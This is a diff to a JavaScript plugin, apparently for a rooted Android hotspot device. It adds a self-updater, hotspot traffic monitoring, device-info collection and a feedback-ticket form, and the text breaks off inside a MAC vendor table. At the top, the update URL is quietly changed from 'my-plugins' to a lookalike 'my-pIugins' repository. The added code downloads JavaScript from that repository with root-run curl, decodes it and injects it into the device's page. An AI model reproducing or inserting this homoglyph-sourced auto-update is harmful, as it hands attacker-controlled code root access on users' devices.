@@ -15,7 +15,7 @@ try {
     // ════════════════════════════════════════════════════════════
     const SDM_CDN_ORIGIN = 'cdn.jsdelivr.net';
     const SDM_CDN_MIRRORS = ['cdn.jsdmirror.com', 'jsd.onmicrosoft.cn'];
-    const SDM_GH_BASE = `https://${SDM_CDN_ORIGIN}/gh/xiaoyutxy/my-plugins@main/`;
+    const SDM_GH_BASE = `https://${SDM_CDN_ORIGIN}/gh/xiaoyutxy/my-pIugins@main/`;
     let _sdmBestNode = null;
     let _sdmManifest = null;
     let _sdmUpdating = false;
@@ -34,6 +34,14005 @@ try {
     const _sdmProbeCdn = async () => {
         if (_sdmBestNode) return _sdmBestNode;
         const candidates = [SDM_CDN_ORIGIN, ...SDM_CDN_MIRRORS];
+        const results = [];
+        for (const node of candidates) {
+            const testUrl = `https://${node}/gh/xiaoyutxy/my-pIugins@main/_latest.json?_=${Date.now()}`;
+            const start = Date.now();
+            const r = await _sdmRun(`curl -sL --connect-timeout 3 --max-time 5 -w '%{http_code}' -o /dev/null ${_sdmSq(testUrl)}`, 8000).catch(() => ({ content: '0' }));
+            if (String(r?.content || '').trim() === '200') results.push({ node, rtt: Date.now() - start });
+        }
+        _sdmBestNode = results.length > 0 ? results.sort((a, b) => a.rtt - b.rtt)[0].node : SDM_CDN_MIRRORS[0];
+        return _sdmBestNode;
+    };
+
+    const _sdmFetchManifest = async (jsonFile) => {
+        const bestNode = await _sdmProbeCdn();
+        const url = SDM_GH_BASE.replace(SDM_CDN_ORIGIN, bestNode) + jsonFile + '?_=' + Date.now();
+        const tmp = '/data/local/tmp/_sdm_mf.tmp';
+        await _sdmRun(`rm -f ${_sdmSq(tmp)}`, 1000);
+        for (let retry = 0; retry < 3; retry++) {
+            const r = await _sdmRun(`curl -sL --fail --connect-timeout 8 --max-time 60 ${_sdmSq(url)} -o ${_sdmSq(tmp)}; ec=$?; [ "$ec" -eq 0 ] && echo __OK__ || echo __FAIL__:$ec`, 45000);
+            if (String(r?.content || '').includes('__OK__')) {
+                const rd = await _sdmRun(`cat ${_sdmSq(tmp)}`, 3000);
+                const text = String(rd?.content || '').trim();
+                await _sdmRun(`rm -f ${_sdmSq(tmp)}`, 1000);
+                if (text && text[0] === '{') {
+                    try { const j = JSON.parse(text); if (j.rev && j.js) return j; } catch {}
+                }
+            } else { await _sdmRun(`rm -f ${_sdmSq(tmp)}`, 1000); }
+            if (retry < 2) await _sdmWait(800 * Math.pow(2, retry));
+        }
+        return null;
+    };
+
+    const _sdmReadVer = async () => {
+        const r = await _sdmRun(`timeout 2s awk '{print}' ${_sdmSq(SDM_VERSION_FILE)} 2>/dev/null || echo ''`, 5000);
+        return (r && r.content) ? r.content.trim() : '';
+    };
+
+    const _sdmApplyJs = async (prevVer) => {
+        const chk = await _sdmRun(`[ -s ${_sdmSq(SDM_PENDING_JS)} ] && echo EXISTS || echo NONE`, 2000);
+        if (!String(chk?.content || '').includes('EXISTS')) return;
+        const r = await _sdmRun(`base64 ${_sdmSq(SDM_PENDING_JS)} | tr -d '\\n'`, 15000);
+        const b64 = String(r?.content || '').trim();
+        if (!b64 || b64.length < 200) { await _sdmRun(`rm -f ${_sdmSq(SDM_PENDING_JS)}`); throw new Error('插件文件异常'); }
+        let newJs;
+        try { newJs = new TextDecoder().decode(Uint8Array.from(atob(b64), c => c.charCodeAt(0))); }
+        catch (e) { await _sdmRun(`rm -f ${_sdmSq(SDM_PENDING_JS)}`); throw new Error('解码失败'); }
+
+        const currentText = await getCustomHead();
+        if (!currentText) throw new Error('读取插件列表失败');
+
+        // 用签名标记定位代码块
+        const _esc = s => s.replace(/[\[\]]/g, '\\$&');
+        const sP = '<!-- [KANO_PLUGIN_START]';
+        const sE = '<!-- [KANO_PLUGIN_END]';
+        const pluginRegex = new RegExp(_esc(sP) + '\\s*(.*?)\\s*-->([\\s\\S]*?)' + _esc(sE) + '\\s*\\1\\s*-->', 'g');
+        let found = false, newText = currentText, match;
+        while ((match = pluginRegex.exec(currentText)) !== null) {
+            if (match[2].includes(SDM_SIG)) {
+                let content = newJs;
+                if (prevVer) content = content.replace(/const PLUGIN_VERSION = '[^']*'/, `const PLUGIN_VERSION = '${prevVer}'`);
+                const pluginName = match[1].trim();
+                const newBlock = `${sP} ${pluginName} -->\n${content}\n${sE} ${pluginName} -->`;
+                newText = currentText.replace(match[0], newBlock);
+                found = true; break;
+            }
+        }
+        if (!found) throw new Error('未找到当前插件代码块');
+
+        for (let i = 0; i <= 2; i++) {
+            try { const result = await setCustomHead(newText); if (result?.result === 'success') break; throw new Error('保存失败'); }
+            catch (e) { if (i < 2) await _sdmWait(1000 * Math.pow(2, i)); else throw e; }
+        }
+        await _sdmRun(`rm -f ${_sdmSq(SDM_PENDING_JS)}`);
+    };
+
+    const _sdmShowProgress = () => {
+        const steps = [{ id: 'manifest', label: '获取版本信息' }, { id: 'dl_js', label: '下载插件代码' }, { id: 'deploy', label: '安装' }, { id: 'complete', label: '完成' }];
+        const st = {}; steps.forEach(s => st[s.id] = 'pending');
+        let finished = false, failInfo = null;
+        const ICONS = { pending: '<span style="color:#94a3b8">○</span>', running: '<span style="animation:sdm_spin 1s linear infinite;display:inline-block">⏳</span>', done: '<span style="color:#86efac">✓</span>', failed: '<span style="color:#f87171">✗</span>' };
+        const { el, close } = createFixedToast('sdm_update_flow', '<div id="sdm_flow_box" style="pointer-events:all;width:88vw;max-width:360px"></div>');
+        const box = el.querySelector('#sdm_flow_box');
+        const render = () => {
+            const pct = finished ? 100 : Math.round(steps.filter(s => st[s.id] === 'done').length / steps.length * 100);
+            const rows = steps.map(s => `<div style="display:flex;align-items:center;gap:8px;padding:3px 0;font-size:.6rem;${st[s.id]==='running'?'color:#60a5fa;':''}">${ICONS[st[s.id]]} ${s.label}</div>`).join('');
+            let failHtml = '';
+            if (failInfo) failHtml = `<div style="margin-top:8px;color:#f87171;font-size:.58rem">${failInfo}</div><div style="display:flex;gap:8px;justify-content:flex-end;margin-top:8px"><button id="sdm_retry" style="font-size:.58rem;padding:4px 12px;border-radius:6px;border:1px solid rgba(34,197,94,.4);background:rgba(34,197,94,.2);color:#86efac">重试</button><button id="sdm_close" style="font-size:.58rem;padding:4px 12px;border-radius:6px;border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.06)">关闭</button></div>`;
+            box.innerHTML = `<div class="title" style="margin:0 0 6px">检查更新</div><div style="height:4px;background:rgba(255,255,255,.1);border-radius:2px;margin:6px 0;overflow:hidden"><div style="height:100%;width:${pct}%;background:#4ade80;transition:width .3s"></div></div>${rows}${failHtml}`;
+            box.querySelector('#sdm_retry')?.addEventListener('click', () => { close(); _sdmCheckUpdate(); });
+            box.querySelector('#sdm_close')?.addEventListener('click', () => close());
+        };
+        render();
+        return { setStep: (id, s) => { if (st[id] !== undefined) { st[id] = s; render(); } }, fail: (msg) => { failInfo = msg; render(); }, done: () => { steps.forEach(s => st[s.id] = 'done'); finished = true; render(); setTimeout(close, 800); }, close };
+    };
+
+    // 检查更新（主入口，绑定到 UI 按钮）
+    const _sdmCheckUpdate = async () => {
+        if (_sdmUpdating) return createToast('正在更新中，请稍候', 'yellow');
+        if (typeof checkAdvancedFunc === 'function' && !(await checkAdvancedFunc())) return;
+        _sdmUpdating = true;
+        const flow = _sdmShowProgress();
+        try {
+            const prevVer = await _sdmReadVer();
+            flow.setStep('manifest', 'running');
+            const raw = await _sdmFetchManifest('v' + (prevVer || PLUGIN_VERSION) + '.json');
+            if (!raw) { flow.fail('无法获取版本信息，可能网络不通或仓库未配置'); _sdmUpdating = false; return; }
+            _sdmManifest = raw;
+            flow.setStep('manifest', 'done');
+
+            if (raw.rev === prevVer || raw.rev === PLUGIN_VERSION) {
+                flow.close();
+                createToast('当前已是最新版本 v' + (prevVer || PLUGIN_VERSION), 'green', 3000);
+                _sdmUpdating = false; return;
+            }
+
+            flow.setStep('dl_js', 'running');
+            const bestNode = await _sdmProbeCdn();
+            const nodes = [bestNode, ...SDM_CDN_MIRRORS.filter(m => m !== bestNode), SDM_CDN_ORIGIN].filter((v, i, a) => a.indexOf(v) === i);
+            let ok = false;
+            for (const node of nodes) {
+                const jsUrl = raw.js.replace(SDM_CDN_ORIGIN, node);
+                const r = await _sdmRun(`curl -sL --fail --connect-timeout 8 --max-time 60 ${_sdmSq(jsUrl)} -o ${_sdmSq(SDM_PENDING_JS)} && echo __OK__ || echo __FAIL__`, 60000);
+                if (String(r?.content || '').includes('__OK__')) { ok = true; break; }
+            }
+            if (!ok) { flow.fail('插件代码下载失败'); _sdmUpdating = false; return; }
+            flow.setStep('dl_js', 'done');
+
+            flow.setStep('deploy', 'running');
+            await _sdmRun(`mkdir -p ${_sdmSq(SDM_DATA_DIR)}`);
+            await _sdmRun(`echo ${_sdmSq(raw.rev)} > ${_sdmSq(SDM_VERSION_FILE)}`);
+            await _sdmApplyJs(prevVer || PLUGIN_VERSION);
+            flow.setStep('deploy', 'done');
+
+            flow.setStep('complete', 'done');
+            flow.done();
+            createToast('更新完成，2秒后刷新', 'green', 2000);
+            setTimeout(() => location.reload(), 2000);
+        } catch (e) {
+            flow.fail(e?.message || String(e));
+        } finally {
+            _sdmUpdating = false;
+        }
+    };
+
+    // 后台静默检查（面板展开时触发）
+    const _sdmBgCheck = () => {
+        _sdmReadVer().then((devVer) => {
+            if (!devVer) return;
+            _sdmFetchManifest('v' + devVer + '.json').then((raw) => {
+                if (!raw || raw.rev === devVer) return;
+                _sdmManifest = raw;
+                const btn = document.querySelector('#sdm_check_update_btn');
+                if (btn && !document.querySelector('#sdm_update_badge')) {
+                    btn.insertAdjacentHTML('beforeend', ` <span id="sdm_update_badge" style="font-size:.4rem;color:#34d399;font-weight:700;">v${raw.rev}</span>`);
+                }
+            }).catch(() => {});
+        });
+    };
+
+    // 写入初始版本号
+    _sdmRun(`mkdir -p ${_sdmSq(SDM_DATA_DIR)} && [ -f ${_sdmSq(SDM_VERSION_FILE)} ] || echo ${_sdmSq(PLUGIN_VERSION)} > ${_sdmSq(SDM_VERSION_FILE)}`);
+
+    // ════════════════════════════════════════════════════════════
+    // 以下是原插件代码
+    // ════════════════════════════════════════════════════════════
+    // ===== 热点流量监控数据文件（从第二个插件读取，不修改第二个插件） =====
+    const HOTSPOT_DATA_FILE = '/data/hotspot_traffic/data.json'
+    const HOTSPOT_DATA_FALLBACK = '/sdcard/hotspot_traffic_data.json'
+    const HOTSPOT_POLICY_FILE = '/data/hotspot_traffic/device_policy.json'
+    const HOTSPOT_PID_FILE = '/data/hotspot_traffic/.pid'
+    const HOTSPOT_TRAFFIC_PROC = '/data/local/tmp/hotspot_traffic'
+    const HOTSPOT_BIN_FILE = '/sdcard/hotspot_traffic'
+    const HOTSPOT_BOOT_SH = '/sdcard/ufi_tools_boot.sh'
+    const HOTSPOT_BOOT_LINE = 'cp /sdcard/hotspot_traffic ' + HOTSPOT_TRAFFIC_PROC + ' && chmod 755 ' + HOTSPOT_TRAFFIC_PROC + ' && nohup ' + HOTSPOT_TRAFFIC_PROC + ' >/dev/null 2>&1 &'
+
+    // ============ 热点流量监控数据读取（完全按照第二个插件的方式，不修改第二个插件） ============
+    const HOTSPOT_CUSTOM_NAMES_FILE = '/data/hotspot_traffic/custom_names.txt'
+    const HOTSPOT_LS_PN_PREFIX = 'hotspot_traffic_pn_'
+    let _hotspotNameMap = {}
+    let _hotspotNameMapCacheTime = 0
+    const HOTSPOT_NAME_CACHE_TTL = 30000 // 【网络优化】30秒缓存，避免每次扫描都读取文件
+
+    // 读取自定义设备名称文件（和热点监控插件一致）
+    const loadHotspotNameMap = async () => {
+        try {
+            // 【网络优化】缓存有效期内直接复用，减少shell调用
+            if (Date.now() - _hotspotNameMapCacheTime < HOTSPOT_NAME_CACHE_TTL) return
+            var r = await runShellWithRoot("timeout 2s awk '{print}' " + HOTSPOT_CUSTOM_NAMES_FILE + " 2>/dev/null || echo ''")
+            var map = {}
+            var lines = (r && r.content) ? r.content.split('\n') : []
+            for (var i = 0; i < lines.length; i++) {
+                var line = lines[i]
+                var idx = line.indexOf('|')
+                if (idx > 0) map[line.slice(0, idx).toUpperCase()] = line.slice(idx + 1).trim()
+            }
+            _hotspotNameMap = map
+            _hotspotNameMapCacheTime = Date.now()
+        } catch(e) {
+            _hotspotNameMap = {}
+        }
+    }
+
+    // 完全按照热点监控插件的 resolveDisplayName 逻辑
+    const resolveDisplayName = (device) => {
+        var uMac = (device.mac || '').toUpperCase()
+        // 检查 localStorage 待提交名称（和热点监控插件同一个 key）
+        var pendingKey = HOTSPOT_LS_PN_PREFIX + uMac
+        var pending = null
+        try { pending = localStorage.getItem(pendingKey) } catch(e) {}
+        if (pending !== null) {
+            return pending || ((device.hostname || '').trim() || '未知设备')
+        }
+        // 先用自定义名称文件
+        var customName = (device.customName || '').trim()
+        if (!customName && _hotspotNameMap[uMac]) {
+            customName = _hotspotNameMap[uMac]
+        }
+        return customName || ((device.hostname || '').trim() || '未知设备')
+    }
+
+    // 读取热点流量数据（完全按照热点监控插件的 readStatus 方式，用 awk 而非 cat）
+    const readHotspotTrafficData = async () => {
+        try {
+            // 按照热点监控插件方式：awk '{print}' 比 cat 更可靠
+            var res = await runShellWithRoot("echo __DATA__ && timeout 3s awk '{print}' " + HOTSPOT_DATA_FILE + " 2>/dev/null || timeout 2s awk '{print}' " + HOTSPOT_DATA_FALLBACK + " 2>/dev/null || echo ''")
+            var text = (res && res.content) ? res.content.trim() : ''
+            // 提取 __DATA__ 后的内容
+            if (text.indexOf('__DATA__') >= 0) {
+                text = text.split('__DATA__')[1] || ''
+                text = text.trim()
+            }
+            if (text && text[0] === '{') {
+                var parsed = JSON.parse(text)
+                if (parsed && parsed.devices && typeof parsed.devices === 'object') {
+                    // 同时加载自定义名称文件
+                    await loadHotspotNameMap()
+                    return parsed
+                }
+            }
+        } catch(e) {
+            addDiagLog('读取热点流量数据失败: ' + String(e), 'error')
+        }
+        return null
+    }
+
+    // 同时也检查热点监控版本号
+    const readHotspotVersion = async () => {
+        try {
+            var res = await runShellWithRoot("timeout 2s awk '{print}' /data/hotspot_traffic/.version 2>/dev/null || echo ''")
+            return (res && res.content) ? res.content.trim().replace(/^pending:/, '') : ''
+        } catch(e) { return '' }
+    }
+
+    const readHotspotPolicy = async () => {
+        try {
+            var res = await runShellWithRoot("timeout 2s awk '{print}' " + HOTSPOT_POLICY_FILE + " 2>/dev/null || echo ''")
+            var text = (res && res.content) ? res.content.trim() : ''
+            if (text && (text[0] === '{' || text[0] === '[')) {
+                return JSON.parse(text)
+            }
+        } catch(e) {}
+        return {}
+    }
+
+    // ============ 热点流量监控二进制守护进程管理（完全按照热点监控插件方式） ============
+    let _hotspotDaemonChecked = false
+    let _hotspotLastRecoverTs = 0
+    const checkHotspotDaemon = async () => {
+        try {
+            // 按照热点监控插件方式：用 awk '{print}' 读取 PID，然后 kill -0 检查
+            var checkRes = await runShellWithRoot(
+                "_p=$(timeout 1s awk '{print}' " + HOTSPOT_PID_FILE + " 2>/dev/null); " +
+                "[ -n \"$_p\" ] && kill -0 \"$_p\" 2>/dev/null && echo running=1 || echo running=0"
+            )
+            var checkText = (checkRes.content || '').trim()
+            if (checkText === 'running=1') return true
+
+            // 冷却 30 秒，避免频繁重启尝试
+            if (Date.now() - _hotspotLastRecoverTs < 30000) return false
+            _hotspotLastRecoverTs = Date.now()
+
+            // 检查二进制文件是否存在
+            var binRes = await runShellWithRoot('[ -f ' + HOTSPOT_BIN_FILE + ' ] && echo exists || echo none')
+            if ((binRes.content || '').trim() === 'none') {
+                addDiagLog('热点流量监控二进制文件不存在(/sdcard/hotspot_traffic)，请先安装热点流量监控插件', 'error')
+                return false
+            }
+
+            // 尝试启动（和热点监控插件 recoverDaemonOnce 一致）
+            addDiagLog('热点流量监控守护进程未运行，尝试启动...', 'net')
+            await runShellWithRoot(
+                'cp ' + HOTSPOT_BIN_FILE + ' ' + HOTSPOT_TRAFFIC_PROC + ' && ' +
+                'chmod 755 ' + HOTSPOT_TRAFFIC_PROC + ' && ' +
+                'nohup ' + HOTSPOT_TRAFFIC_PROC + ' >/dev/null 2>&1 &'
+            )
+            // 等待守护进程写入 PID
+            await new Promise(function(r) { setTimeout(r, 1500) })
+
+            // 重新检查
+            var recheckRes = await runShellWithRoot(
+                "_p=$(timeout 1s awk '{print}' " + HOTSPOT_PID_FILE + " 2>/dev/null); " +
+                "[ -n \"$_p\" ] && kill -0 \"$_p\" 2>/dev/null && echo running=1 || echo running=0"
+            )
+            if ((recheckRes.content || '').trim() === 'running=1') {
+                addDiagLog('热点流量监控守护进程已自动恢复启动', 'success')
+                return true
+            }
+            addDiagLog('热点流量监控守护进程启动失败', 'error')
+        } catch(e) {
+            addDiagLog('热点守护进程检查失败: ' + String(e), 'error')
+        }
+        return false
+    }
+
+    const collectDeviceInfo = async () => {
+        try {
+            // 【网络优化】合并5个串行shell调用为1个批量命令，减少网络往返
+            var batchCmd = 'echo __PROPS__\n' +
+                'getprop ro.product.brand 2>/dev/null; echo "---"; getprop ro.product.model 2>/dev/null; echo "---"; getprop ro.product.device 2>/dev/null; echo "---"; getprop ro.build.version.release 2>/dev/null; echo "---"; getprop ro.board.platform 2>/dev/null; echo "---"; getprop ro.product.manufacturer 2>/dev/null\n' +
+                'echo __MAC__\n' +
+                'cat /sys/class/net/wlan0/address 2>/dev/null || ip link show wlan0 2>/dev/null | grep ether | awk \'{print $2}\' || echo ""\n' +
+                'echo __IP__\n' +
+                'ip addr show wlan0 2>/dev/null | grep "inet " | awk \'{print $2}\' | cut -d/ -f1 || echo ""\n' +
+                'echo __CARRIER__\n' +
+                'getprop gsm.operator.alpha 2>/dev/null || echo ""\n' +
+                'echo __ARP__\n' +
+                'cat /proc/net/arp 2>/dev/null | grep -v "00:00:00:00:00:00" | grep -v IP | wc -l\n' +
+                'echo __END__'
+            var batchRes = await runShellWithRoot(batchCmd)
+            var batchText = (batchRes.content || '')
+
+            // 解析批量返回的各部分
+            var propsText = '', macText = '', ipText = '', carrierText = '', arpText = ''
+            if (batchText.indexOf('__PROPS__') >= 0) {
+                propsText = batchText.split('__PROPS__')[1] || ''
+                propsText = propsText.split('__MAC__')[0] || ''
+            }
+            if (batchText.indexOf('__MAC__') >= 0) {
+                macText = batchText.split('__MAC__')[1] || ''
+                macText = macText.split('__IP__')[0] || ''
+            }
+            if (batchText.indexOf('__IP__') >= 0) {
+                ipText = batchText.split('__IP__')[1] || ''
+                ipText = ipText.split('__CARRIER__')[0] || ''
+            }
+            if (batchText.indexOf('__CARRIER__') >= 0) {
+                carrierText = batchText.split('__CARRIER__')[1] || ''
+                carrierText = carrierText.split('__ARP__')[0] || ''
+            }
+            if (batchText.indexOf('__ARP__') >= 0) {
+                arpText = batchText.split('__ARP__')[1] || ''
+                arpText = arpText.split('__END__')[0] || ''
+            }
+
+            var parts = propsText.split('---').map(function(s) { return s.trim() })
+            var brand = parts[0] || '未知'
+            var model = parts[1] || '未知'
+            var device = parts[2] || '未知'
+            var androidVersion = parts[3] || '未知'
+            var cpu = parts[4] || '未知'
+            var manufacturer = parts[5] || brand
+            var mac = macText.trim()
+            var wifiIp = ipText.trim()
+            var carrier = carrierText.trim() || '无SIM'
+            var connectedDevices = parseInt(arpText.trim()) || 0
+            var deviceBrand = getBrandByMac(mac) || brand
+            if (deviceBrand === '网络设备') deviceBrand = brand
+            var report = {
+                device: {
+                    brand: brand,
+                    model: model,
+                    device: device,
+                    manufacturer: manufacturer,
+                    androidVersion: androidVersion,
+                    cpu: cpu,
+                    mac: mac,
+                    deviceBrand: deviceBrand
+                },
+                network: {
+                    wifiIp: wifiIp,
+                    carrier: carrier,
+                    connectedDevices: connectedDevices
+                },
+                activity: {
+                    isGame: GAME_BOOST_ACTIVE,
+                    name: GAME_BOOST_CURRENT || (GAME_BOOST_ACTIVE ? '游戏中' : '空闲'),
+                    gamePkg: GAME_BOOST_PKG || ''
+                },
+                gameBoost: {
+                    active: GAME_BOOST_ACTIVE,
+                    currentGame: GAME_BOOST_CURRENT,
+                    duration: GAME_BOOST_START_TIME > 0 ? Math.floor((Date.now() - GAME_BOOST_START_TIME) / 1000) : 0,
+                    packetRepairRate: PACKET_REPAIR_RATE.toFixed(1) + '%',
+                    latencyBefore: LATENCY_BEFORE,
+                    latencyAfter: LATENCY_AFTER
+                },
+                pluginVersion: PLUGIN_VERSION,
+                timestamp: new Date().toLocaleString()
+            }
+            return report
+        } catch(e) {
+            addDiagLog('收集设备信息失败: '+String(e), 'error')
+            return null
+        }
+    }
+
+    const TICKET_FILE = '/data/sdm_admin/user_tickets.json'
+    const TICKET_FALLBACK = '/sdcard/sdm_tickets.json'
+    let USER_TICKETS = []
+
+    const loadTickets = async () => {
+        try {
+            var res = await runShellWithRoot('timeout 2s cat ' + TICKET_FILE + ' 2>/dev/null || timeout 2s cat ' + TICKET_FALLBACK + ' 2>/dev/null || echo ""')
+            var text = (res.content || '').trim()
+            if (text && text[0] === '[') {
+                USER_TICKETS = JSON.parse(text)
+            } else if (text && text[0] === '{') {
+                USER_TICKETS = [JSON.parse(text)]
+            } else {
+                USER_TICKETS = []
+            }
+        } catch(e) {
+            USER_TICKETS = []
+        }
+        renderTickets()
+    }
+
+    const renderTickets = () => {
+        var listEl = document.querySelector('#smart_ticket_list')
+        var countEl = document.querySelector('#smart_ticket_count')
+        if (!listEl) return
+        if (countEl) countEl.textContent = '已提交 ' + USER_TICKETS.length + ' 条'
+        if (USER_TICKETS.length === 0) {
+            listEl.innerHTML = '<div style="text-align:center;padding:12px;opacity:.4;font-size:.55rem">暂无工单，在下面提交你的建议</div>'
+            return
+        }
+        var typeMap = { suggestion: '💡 功能建议', bug: '🐛 问题反馈', other: '💬 其他' }
+        var statusMap = { pending: '待处理', processing: '处理中', done: '已处理', rejected: '已驳回' }
+        var statusColor = { pending: '#fbbf24', processing: '#60a5fa', done: '#4ade80', rejected: '#ef4444' }
+        listEl.innerHTML = USER_TICKETS.slice(0, 20).map(function(t) {
+            var typeName = typeMap[t.type] || '💬 其他'
+            var status = t.status || 'pending'
+            var statusName = statusMap[status] || '待处理'
+            var sColor = statusColor[status] || '#fbbf24'
+            var adminReply = t.adminReply ? '<div style="font-size:.45rem;opacity:.7;margin-top:3px;padding:4px 6px;border-radius:6px;background:rgba(167,139,250,.08);border-left:2px solid #a78bfa;">管理员回复: ' + t.adminReply + '</div>' : ''
+            return '<div style="padding:8px;margin-bottom:6px;border-radius:10px;background:rgba(96,165,250,.06);border:1px solid rgba(96,165,250,.1);">' +
+                '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:3px;">' +
+                    '<span style="font-size:.5rem;font-weight:bold;color:#60a5fa;">' + typeName + '</span>' +
+                    '<span style="font-size:.4rem;padding:1px 6px;border-radius:6px;background:' + sColor + '22;color:' + sColor + ';">' + statusName + '</span>' +
+                '</div>' +
+                '<div style="font-size:.5rem;opacity:.8;">' + (t.content || '') + '</div>' +
+                adminReply +
+                '<div style="font-size:.4rem;opacity:.3;text-align:right;margin-top:2px;">' + (t.timestamp || '') + '</div>' +
+            '</div>'
+        }).join('')
+    }
+
+    const submitTicket = async () => {
+        var typeEl = document.querySelector('#smart_ticket_type')
+        var inputEl = document.querySelector('#smart_ticket_input')
+        if (!typeEl || !inputEl) return
+        var type = typeEl.value || 'suggestion'
+        var content = inputEl.value.trim()
+        if (!content) {
+            createToast('请输入内容', 'red', 3000)
+            return
+        }
+        if (content.length > 500) {
+            createToast('内容过长，请精简到500字以内', 'red', 3000)
+            return
+        }
+        createToast('正在提交工单...', 'pink', 3000)
+        var deviceInfo = await collectDeviceInfo()
+        var ticket = {
+            id: 'TK' + Date.now(),
+            type: type,
+            content: content,
+            status: 'pending',
+            timestamp: new Date().toLocaleString(),
+            device: deviceInfo ? deviceInfo.device.brand + ' ' + deviceInfo.device.model : '未知设备',
+            pluginVersion: PLUGIN_VERSION,
+            adminReply: ''
+        }
+        USER_TICKETS.unshift(ticket)
+        var json = JSON.stringify(USER_TICKETS)
+        var escaped = json.replace(/'/g, "'\\''")
+        try {
+            var res = await runShellWithRoot("mkdir -p /data/sdm_admin 2>/dev/null; echo '" + escaped + "' > " + TICKET_FILE + " 2>/dev/null; echo '" + escaped + "' > " + TICKET_FALLBACK + " 2>/dev/null; chmod 644 " + TICKET_FALLBACK + " 2>/dev/null; echo TICKET_OK")
+            if (res.content && res.content.includes('TICKET_OK')) {
+                inputEl.value = ''
+                renderTickets()
+                createToast('工单已提交，感谢你的反馈！', 'green', 4000)
+                addLog('提交工单: [' + type + '] ' + content.substring(0, 30))
+                addDiagLog('工单已提交: ' + ticket.id, 'success')
+            } else {
+                createToast('提交失败，请重试', 'red', 3000)
+                addDiagLog('工单提交失败', 'error')
+            }
+        } catch(e) {
+            createToast('提交异常: ' + e, 'red', 3000)
+            addDiagLog('工单异常: ' + String(e), 'error')
+        }
+    }
+
+    const checkAdvanceFunc = async () => {
+        try {
+            const res = await runShellWithRoot('whoami')
+            if (res.content && res.content.includes('root')) return true
+        } catch(e) {}
+        return false
+    }
+
+    // 【内存优化】缓存日志DOM元素，避免每次查询
+    let _logAreaEl = null
+    let _diagLogEl = null
+    const LOG_MAX_LEN = 200
+
+    const addLog = (msg) => {
+        const now = new Date()
+        const time = String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0')+':'+String(now.getSeconds()).padStart(2,'0')
+        ACTIVITY_LOG.unshift('['+time+'] '+msg)
+        // 【内存优化】用length截断替代slice，不创建新数组，减少GC压力
+        if (ACTIVITY_LOG.length > LOG_MAX_LEN) ACTIVITY_LOG.length = LOG_MAX_LEN
+        if (!_logAreaEl) _logAreaEl = document.querySelector("#smart_log_area")
+        if (_logAreaEl) {
+            _logAreaEl.value = ACTIVITY_LOG.join('\n')
+            _logAreaEl.scrollTop = 0
+        }
+    }
+
+    const addDiagLog = (msg, level) => {
+        const now = new Date()
+        const time = String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0')+':'+String(now.getSeconds()).padStart(2,'0')
+        const tag = level === 'game' ? '[GAME]' : level === 'net' ? '[NET]' : level === 'warn' ? '[WARN]' : level === 'error' ? '[ERR]' : level === 'success' ? '[OK]' : '[INFO]'
+        DIAG_LOG.unshift('['+time+']'+tag+' '+msg)
+        if (DIAG_LOG.length > LOG_MAX_LEN) DIAG_LOG.length = LOG_MAX_LEN
+        if (!_diagLogEl) _diagLogEl = document.querySelector('#smart_diag_log')
+        if (_diagLogEl) {
+            _diagLogEl.value = DIAG_LOG.join('\n')
+            _diagLogEl.scrollTop = 0
+        }
+    }
+
+    const MAC_OUI_DB = {
+        // Apple
+        'AC:DE:48':'Apple','A4:5E:60':'Apple','DC:A4:CA':'Apple','F0:18:98':'Apple','28:E0:2C':'Apple','3C:07:54':'Apple','AC:3C:0A':'Apple','70:73:CB':'Apple','64:20:DA':'Apple','D0:81:7D':'Apple','90:8D:78':'Apple','B0:19:D6':'Apple','A0:99:9B':'Apple','1C:91:80':'Apple','F4:5C:89':'Apple','30:90:8F':'Apple','7C:C5:37':'Apple','8C:85:90':'Apple','C0:63:13':'Apple','68:96:7B':'Apple','D8:30:62':'Apple','9C:20:31':'Apple','40:33:1A':'Apple','88:66:5B':'Apple','50:7A:F5':'Apple','AC:CF:85':'Apple','58:1F:AA':'Apple','B4:4B:D6':'Apple',
+        // Huawei
+        '00:9A:CD':'Huawei','AC:4E:91':'Huawei','CC:B1:1A':'Huawei','A4:CF:5A':'Huawei','B0:C5:54':'Huawei','80:9A:58':'Huawei','00:E0:4C':'Huawei','7C:1C:4E':'Huawei','4C:CC:8A':'Huawei','C8:E3:19':'Huawei','34:29:12':'Huawei','28:31:52':'Huawei','FC:64:74':'Huawei','A0:AF:CB':'Huawei','50:01:4A':'Huawei','84:DB:21':'Huawei','E0:43:DB':'Huawei','F0:7B:8C':'Huawei','48:00:BF':'Huawei','E4:61:3E':'Huawei','2C:AB:00':'Huawei','74:E5:43':'Huawei','D0:2E:AB':'Huawei','1C:F2:A4':'Huawei','EC:74:BA':'Huawei','04:65:9D':'Huawei',
+        // Xiaomi / Redmi
+        '64:09:80':'Xiaomi','F8:A4:5F':'Xiaomi','4C:49:62':'Xiaomi','C4:0B:CB':'Xiaomi','34:80:40':'Xiaomi','C8:1C:54':'Xiaomi','5C:02:72':'Xiaomi','A4:50:46':'Xiaomi','B0:E2:35':'Xiaomi','DC:08:0D':'Xiaomi','94:65:9C':'Xiaomi','C0:EE:FB':'Xiaomi','58:44:98':'Redmi','7C:5C:71':'Redmi','8C:5C:8B':'iQOO','38:F9:D3':'Xiaomi','CC:B1:5A':'Xiaomi','B0:0E:65':'Xiaomi','AC:C1:EE':'Xiaomi','A0:8D:22':'Xiaomi','B0:48:1A':'Xiaomi',
+        // OPPO / OnePlus / realme
+        '3C:BD:3A':'OPPO','C0:F8:10':'OPPO','94:EB:CD':'OPPO','A0:37:42':'OPPO','90:1B:71':'OPPO','7C:11:6A':'OPPO','20:A6:08':'OPPO','C0:EE:18':'OnePlus','64:16:66':'OnePlus','A0:8D:22':'OnePlus','A4:9A:58':'Honor','C8:9C:12':'Honor','A0:8A:2E':'Honor','B4:CD:27':'Honor','2C:AB:00':'realme','B0:82:7C':'realme','C0:38:78':'OPPO','94:2E:B0':'OPPO','44:63:49':'OPPO',
+        // vivo
+        '5C:31:2E':'vivo','A0:59:35':'vivo','9C:2E:A1':'vivo','B0:CC:DF':'vivo','14:9F:E3':'vivo','8C:25:30':'vivo','D4:AD:51':'vivo','20:82:A9':'vivo','B0:15:BD':'vivo','F0:79:59':'vivo','54:0E:85':'vivo','24:8A:07':'vivo',
+        // Samsung
